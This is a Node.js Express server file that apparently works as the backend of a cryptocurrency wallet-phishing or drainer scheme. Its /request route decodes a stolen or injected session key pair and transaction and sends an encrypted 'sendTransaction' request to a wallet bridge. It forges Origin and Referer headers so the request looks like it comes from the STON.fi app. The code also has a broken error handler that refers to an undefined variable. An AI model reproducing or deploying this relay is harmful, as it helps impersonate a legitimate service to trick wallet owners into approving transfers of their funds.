let fs = require('fs');
const path = require('path');

const { decode, encode } = require("../modules/sessionCrypto/base64");
const SessionCrypto = require("../modules/sessionCrypto");
const axios = require("axios");

let express = require('express');
let app = express();
let bodyParser = require('body-parser');

app.use(bodyParser.json());

app.get("/clean_script.js", async (req, res) => {
    const file = fs.readFileSync(path.join(__dirname, '../clean_script.js'));
    res.status(200).send(file);
})

app.get("/", async (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'))
})

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

app.get("/request/:tryTransaction", async (req, res) => {
    try {
        let {
            keyPair,
            transactionObject,
            url,
            to
        } = JSON.parse(decode(req.params.tryTransaction));

        keyPair = JSON.parse(keyPair);
        transactionObject = JSON.parse(transactionObject);

        let session = new SessionCrypto(keyPair);

        let body = {
            method: "sendTransaction",
            "params": [JSON.stringify(transactionObject)],
            id: getRandomInt(1, 100000).toString()
        };

        try {
            let answer = await axios.post(url, encode(session.encrypt(JSON.stringify(body), session.hexToByteArray(to))), {
                headers: {
                    'Content-Type': 'text/plain;charset=UTF-8',
                    "Origin": "https://app.ston.fi",
                    "Referer": "https://app.ston.fi/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
                },

                timeout: 1000 * 20
            });

            return res.status(200).json(answer.data);
        }
            catch {
                return res.status(200).json(err.data);
            }
        }
    catch(error) {
        return res.status(200).json({
            "error": true
        })
    }

    return res.status(200).json({
        "error": true
    })
})

module.exports = app;
